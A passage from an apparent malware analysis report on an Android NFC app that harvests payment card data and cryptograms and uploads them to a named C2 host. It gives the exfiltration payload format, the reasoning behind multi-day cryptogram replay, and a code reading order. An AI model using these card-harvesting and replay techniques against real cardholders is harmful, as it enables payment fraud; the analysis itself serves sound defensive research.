                              └─ otherwise: row stays for B2.s to retry
B2.s every 10s ── re-read cards+transactions, retry uploads, delete on success
B2.t every 60s ── fetch /me, replace cves, maybe trigger self-update
SyncWorker /15m ── safety net: replace cves only (no update path)
```

### 3.3 Wire payload (canonical upload JSON, built by `B2.q`, `B2.s`, and `B2.o`)

```jsonc
{
  "pan":           "4123…",
  "aid":           "A0000000031010",
  "network":       "Visa",         // Visa | Mastercard | Unknown
  "tx_count":      20,
  "raw_data":      { /* TLV map (object if it parses, else string) */ },
  "harvested_txs": [
    {
      "atc":     "0042",
      "arqc":    "5A1F09…",
      "time_ms": 187.5,
      "cve_id":  3,
      "params":  { "9F02": "000000010000", "9A": "260516", "...": "..." }
    }
  ]
}
```

---

## 4. Common questions a junior researcher will have

**Q: Why are so many classes called `B2.q`, `B2.s`, `B2.t` — is that the operator's choice?**
No. The Kotlin → Java compiler emits a class per coroutine/lambda. R8 then renames everything to single letters. The original Kotlin filenames in this build are recoverable from `.kotlin_metadata` attributes inside the dex; jadx can sometimes surface them but didn't here.

**Q: Where exactly is the cryptogram (ARQC) generated?**
**On the card**, not in this APK. The harvester *asks* the card for the cryptogram via the EMV "GENERATE AC" APDU sequence. The Rust kernel does not (and cannot) compute ARQCs — it lacks the issuer master key. What it *can* do is choose how the request is presented (CDOL data, unpredictable number) so the cryptogram comes back shaped for downstream use.

**Q: Why three days of `9A`?**
EMV terminals supply the transaction date. Producing cryptograms for "today / today+1 / today+2" gives the operator multiple-day replay candidates without re-engaging the victim.

**Q: Is the API key encrypted on the device?**
No. It's stored as plaintext in `stats.api_key`. Anyone with adb-backup or root can read it. `allowBackup="true"` in the manifest makes the database recoverable on debuggable builds.

**Q: How does the app survive a reboot?**
It doesn't, really. `RECEIVE_BOOT_COMPLETED` is declared but **no** `BootReceiver` is registered — so persistence depends on the user re-opening "Geometry Saver". `WAKE_LOCK` + `FOREGROUND_SERVICE` + battery-optimization whitelist keep it alive *while* it's running; nothing brings it back after reboot.

**Q: Could the operator change the C2 host without shipping a new APK?**
No. `"https://tqqemv.xyz"` is a string literal in three Java/Kotlin call sites (`SyncWorker`, `B2.s`, `B2.t`, `B2.o`) plus the `MainActivity.w` self-update path. Changing it requires a new APK — and the updater downloads APKs from the same host, so if the host dies, the entire fleet is bricked from a control-plane perspective.

---

## 5. Suggested reading order if you want to read the code yourself

1. `EmvKernel.java`, `Reporter.java` — see the JNI surface; understand that everything important is in the `.so`.
2. `CveConfig.java`, `CardRecord.java`, `HarvestedTx.java`, `MeResponse.java`, `AppVersion.java` — get the data model in your head.
3. `B2/a.java` (DatabaseHelper) — `onCreate` SQL is the source of truth for what gets persisted.
4. `MainActivity.onCreate` — see how the three coroutines and the WorkManager job are wired up.
5. `MainActivity.onResume` + `onNewIntent` — see how an NFC tap reaches `B2.q`.
6. `B2/q.java` — read top-to-bottom for the tap-time harvest loop.
7. `B2/s.java` — the upload loop.
8. `B2/t.java` — the config & self-update loop.
9. `MainActivity.w` + `B2/h.java` — the sideload path.
10. Skip `R.java`, the compiler-generated continuation classes (`c/f/g/i/j/k`), and the decoy UI (`B2.w/v/u case 0`) unless you specifically need them.

If something in the code disagrees with this report, the **code is right and this report is stale** — please correct it.
